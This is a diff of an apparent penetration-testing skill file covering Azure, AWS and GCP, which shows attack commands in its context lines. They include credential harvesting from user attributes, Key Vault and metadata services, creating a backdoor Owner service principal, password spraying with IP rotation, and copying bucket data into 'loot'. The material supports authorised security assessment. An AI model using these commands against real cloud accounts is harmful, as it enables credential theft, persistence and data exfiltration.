@@ -1,4 +1,4 @@
-﻿---
+---
 name: cloud-penetration-testing
 description: "Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP)."
 risk: offensive
@@ -21,6 +21,7 @@ Conduct comprehensive security assessments of cloud infrastructure across Micros
 
 ### Required Tools
 ```bash
+
 # Azure tools
 Install-Module -Name Az -AllowClobber -Force
 Install-Module -Name MSOnline -Force
@@ -63,6 +64,7 @@ pip install scoutsuite pacu
 Gather initial information about target cloud presence:
 
 ```bash
+
 # Azure: Get federation info
 curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
 
@@ -81,6 +83,7 @@ cat ips.txt | python3 ip2provider.py
 Authenticate to Azure environments:
 
 ```powershell
+
 # Az PowerShell Module
 Import-Module Az
 Connect-AzAccount
@@ -105,6 +108,7 @@ Connect-MsolService
 Discover Azure resources and permissions:
 
 ```powershell
+
 # List contexts and subscriptions
 Get-AzContext -ListAvailable
 Get-AzSubscription
@@ -150,6 +154,7 @@ Get-MsolServicePrincipal
 Exploit Azure misconfigurations:
 
 ```powershell
+
 # Search user attributes for passwords
 $users = Get-MsolUser -All
 foreach($user in $users){
@@ -181,6 +186,7 @@ az keyvault secret show --id <URI>
 Establish persistence in Azure:
 
 ```powershell
+
 # Create backdoor service principal
 $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
 $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
@@ -204,8 +210,10 @@ az ad user create --display-name <name> --password <pass> --user-principal-name 
 Authenticate to AWS environments:
 
 ```bash
+
 # Configure AWS CLI
 aws configure
+
 # Enter: Access Key ID, Secret Access Key, Region, Output format
 
 # Use specific profile
@@ -220,6 +228,7 @@ aws sts get-caller-identity
 Discover AWS resources:
 
 ```bash
+
 # Account information
 aws sts get-caller-identity
 aws iam list-users
@@ -254,9 +263,11 @@ aws directconnect describe-connections
 Exploit AWS misconfigurations:
 
 ```bash
+
 # Check for public RDS snapshots
 aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
 aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
+
 # AttributeValues = "all" means publicly accessible
 
 # Extract Lambda environment variables (may contain secrets)
@@ -276,6 +287,7 @@ curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-toke
 Establish persistence in AWS:
 
 ```bash
+
 # List existing access keys
 aws iam list-access-keys --user-name <username>
 
@@ -293,6 +305,7 @@ done
 Discover GCP resources:
 
 ```bash
+
 # Authentication
 gcloud auth login
 gcloud auth activate-service-account --key-file creds.json
@@ -338,6 +351,7 @@ kubectl cluster-info
 Exploit GCP misconfigurations:
 
 ```bash
+
 # Get metadata service data
 curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
 
@@ -444,7 +458,9 @@ gcloud auth list
 **Scenario:** Test Azure AD password policy
 
 ```powershell
+
 # Using MSOLSpray with FireProx for IP rotation
+
 # First create FireProx endpoint
 python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create
 
@@ -458,6 +474,7 @@ Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api
 **Scenario:** Find and access misconfigured S3 buckets
 
 ```bash
+
 # List all buckets
 aws s3 ls | awk '{print $3}' > buckets.txt
 
@@ -476,6 +493,7 @@ aws s3 sync s3://misconfigured-bucket ./loot/
 **Scenario:** Pivot using compromised service account
 
 ```bash
+
 # Authenticate with service account key
 gcloud auth activate-service-account --key-file compromised-sa.json
 
